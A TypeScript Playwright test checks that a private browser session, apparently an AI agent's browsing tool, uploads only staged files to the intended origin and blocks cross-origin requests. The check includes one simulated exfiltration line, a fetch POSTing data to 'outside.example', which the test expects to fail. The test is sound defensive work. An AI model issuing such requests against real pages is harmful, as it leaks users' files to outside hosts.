import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import * as path from 'node:path'
import type { Page } from 'playwright'
import { assert, test } from '#test'
import { prepareBrowserUploads } from '../task/uploads.ts'
import { SignInBroker } from './broker.ts'
import { PrivateBrowserSession } from './session.ts'

test(
  'private uploads admit only staged files at the chosen origin and block requests escaping afterward',
  { timeout: 30000 },
  async () => {
    const root = await mkdtemp(path.join(tmpdir(), 'sky-upload-browser-'))
    const source = path.join(root, 'example.pdf')
    await writeFile(source, '%PDF-1.4 synthetic example')
    await mkdir(path.join(root, 'task'))
    const uploads = await prepareBrowserUploads([source], 'https://atlas.example', path.join(root, 'task'))
    let page!: Page
    let posted = ''
    let escaped = 0
    const browser = await PrivateBrowserSession.launch({
      filesDir: path.join(root, 'downloads'),
      profileDir: path.join(root, 'profile'),
      uploads,
      headless: true,
      broker: new SignInBroker({
        sources: async () => [],
        connect: async () => {
          throw new Error('No credentials in this test')
        },
        approval: { allowLookup: async () => false, choose: async () => null },
      }),
      prepare: async (created) => {
        page = created
        await page.context().route('**/*', async (route) => {
          const request = route.request()
          if (new URL(request.url()).hostname === 'outside.example') escaped++
          if (new URL(request.url()).pathname === '/receive') {
            posted = request.postData() ?? ''
            await route.fulfill({ body: 'received' })
            return
          }
          await route.fulfill({
            contentType: 'text/html',
            body: '<title>Atlas example upload</title><h1>Choose documents</h1><input id="files" type="file" hidden><button onclick="document.getElementById(\'files\').click()">Choose files</button><script>document.getElementById("files").onchange = async event => { await fetch("/receive", { method: "POST", body: event.target.files[0] }); document.querySelector("h1").textContent = "Upload received"; }</script>',
          })
        })
      },
    })
    try {
      await browser.callTool('browser_navigate', { url: 'https://other.example' })
      await page.getByRole('button', { name: 'Choose files' }).click()
      const wrongOrigin = await browser.callTool('browser_file_upload', { paths: [uploads.files[0]!.path] })
      await browser.callTool('browser_navigate', { url: uploads.origin })
      await page.getByRole('button', { name: 'Choose files' }).click()
      const wrongFile = await browser.callTool('browser_file_upload', { paths: [source] })
      const selected = await browser.callTool('browser_file_upload', { paths: [uploads.files[0]!.path] })
      await page.getByRole('heading', { name: 'Upload received' }).waitFor()
      const receipt = await browser.callTool('browser_snapshot', {})
      const leaked = await page.evaluate(async () => {
        try {
          await fetch('https://outside.example/receive', { method: 'POST', body: 'example bytes' })
          return true
        } catch {
          return false
        }
      })
      assert({
        given: 'a private browser with a concrete upload manifest',
        should:
          'reject another origin and an unstaged path, upload the intended bytes, expose the receipt, and prevent cross-origin leakage',
        actual: [
          wrongOrigin.isError,
          wrongFile.isError,
          selected.isError,
          posted,
          JSON.stringify(receipt).includes('Upload received'),
          leaked,
          escaped,
        ],
        expected: [true, true, false, '%PDF-1.4 synthetic example', true, false, 0],
      })
    } finally {
      await browser.close()
      await rm(root, { recursive: true, force: true })
    }
  },
)
